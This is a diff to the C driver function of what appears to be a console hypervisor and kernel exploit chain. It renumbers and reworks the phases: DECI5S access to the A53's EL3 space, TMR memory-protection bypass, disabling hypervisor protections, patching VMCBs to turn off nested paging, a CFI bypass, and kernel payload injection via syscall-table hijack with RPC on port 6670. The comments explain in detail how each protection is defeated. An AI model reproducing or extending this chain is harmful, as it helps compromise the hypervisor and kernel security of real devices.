@@ -202,20 +202,28 @@ int prosperous_run(void)
         return ret;
     }
 
-    /* Phase 1: TMR bypass
+    /* Phase 1: Initialize DECI5S for A53 communication.
      *
-     * Disable TMR 20 (MP4 DRAM protection) and create TMR 21 to cover
-     * the gap. Re-enable TMR 20 immediately — we only need it briefly
-     * disabled for the TMR bypass init. The A53 accesses its own DRAM
-     * through IOMMU, not through x86 TMR.
+     * DECI5S provides read/write access to the A53's entire EL3 address
+     * space WITHOUT custom code execution. We use it to:
+     *   - Configure SYSHUB TLB registers (map HV system PAs)
+     *   - Read/write VMCB data through the TLB-mapped addresses
      *
-     * NOTE: We no longer inject an A53 payload or use DECI5S for code
-     * execution. The I-cache coherency problem (DECI5S writes update
-     * D-cache/DRAM but not I-cache) makes A53 code patches unreliable.
-     * Instead, we access HV memory directly from x86 via DMAP after
-     * TMR bypass — no A53 involvement needed.
+     * This bypasses the I-cache coherency problem entirely — no code
+     * patches, no payload injection, no I-cache flush needed. Pure data
+     * operations through the existing DECI5S firmware handler.
      */
-    printf("\n[*] Phase 1: TMR bypass...\n");
+    printf("\n[*] Phase 1: DECI5S initialization...\n");
+
+    ret = deci5s_init(&ctx);
+    if (ret != 0) {
+        printf("[!] DECI5S init failed: %d\n", ret);
+        return ret;
+    }
+    printf("[+] DECI5S ready\n");
+
+    /* Phase 2: TMR bypass */
+    printf("\n[*] Phase 2: TMR bypass...\n");
 
     ret = tmr_bypass_init(&ctx);
     if (ret != 0) {
@@ -227,8 +235,8 @@ int prosperous_run(void)
     tmr_restore_tmr20(&ctx);
     printf("[+] TMR 20 restored\n");
 
-    /* Phase 2: Disable HV TMR protections */
-    printf("\n[*] Phase 2: Disabling HV TMR protections...\n");
+    /* Phase 3: Disable HV TMR protections */
+    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");
 
     ret = tmr_disable_hv_regions(&ctx);
     if (ret != 0) {
@@ -238,12 +246,14 @@ int prosperous_run(void)
     }
     printf("[+] HV TMR protections disabled\n");
 
-    /* Phase 3: VMCB patching — directly via DMAP (no A53 needed)
+    /* Phase 4: VMCB patching via DECI5S + SYSHUB TLB
      *
-     * With HV TMRs disabled, x86 can access VMCB structures directly
-     * via DMAP. No SYSHUB TLB setup or A53 code execution required.
+     * x86 cannot directly access VMCB memory (NPT blocks it). Instead,
+     * we use DECI5S to configure SYSHUB TLB entries on the A53, then
+     * read/write VMCB data through those entries. No custom A53 code
+     * execution — pure DECI5S register writes.
      */
-    printf("\n[*] Phase 3: VMCB patching (disabling nested paging)...\n");
+    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");
 
     ret = vmcb_patch_disable_np(&ctx);
     if (ret != 0) {
@@ -253,8 +263,8 @@ int prosperous_run(void)
     }
     printf("[+] Nested paging disabled on all VMCBs\n");
 
-    /* Phase 4: CFI bypass */
-    printf("\n[*] Phase 4: CFI bypass...\n");
+    /* Phase 5: CFI bypass */
+    printf("\n[*] Phase 5: CFI bypass...\n");
 
     ret = cfi_bypass(&ctx);
     if (ret != 0) {
@@ -264,13 +274,13 @@ int prosperous_run(void)
     }
     printf("[+] CFI check_fail patched\n");
 
-    /* Phase 5: Restore TMR protections */
-    printf("\n[*] Phase 5: Restoring TMR protections...\n");
+    /* Phase 6: Restore TMR protections */
+    printf("\n[*] Phase 6: Restoring TMR protections...\n");
     tmr_restore_hv_regions(&ctx);
     printf("[+] TMR protections restored\n");
 
-    /* Phase 6: Kernel payload injection */
-    printf("\n[*] Phase 6: Kernel payload injection...\n");
+    /* Phase 7: Kernel payload injection */
+    printf("\n[*] Phase 7: Kernel payload injection...\n");
     printf("[*] kpayload will be injected via syscall table hijack.\n");
     printf("[*] After injection, connect to port 6670 for RPC access.\n");
 
